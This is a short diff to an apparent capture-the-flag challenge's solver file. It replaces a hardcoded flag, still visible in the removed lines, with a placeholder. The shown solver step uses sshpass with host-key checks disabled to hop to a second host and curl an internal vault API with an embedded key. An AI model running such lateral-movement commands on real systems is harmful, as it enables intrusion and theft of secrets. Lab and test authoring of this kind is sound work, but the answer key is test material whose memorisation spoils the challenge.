@@ -35,10 +35,10 @@ solver:
     command: 'sshpass -p ''{cred.appuser.pass}'' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} ''curl -s -H "X-API-Key: MTB_k3y_h0p_l4t3r4l" http://meridian-core:8080/api/vault'' 2>&1'
     expect: l4t3r4l
   - name: Assemble and verify complete flag
-    command: echo 'OCR{thr33_h0p_l4t3r4l}'
+    command: echo '{flag}'
     expect: OCR{
 expected_flag_count: 1
-expected_flag: OCR{thr33_h0p_l4t3r4l}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
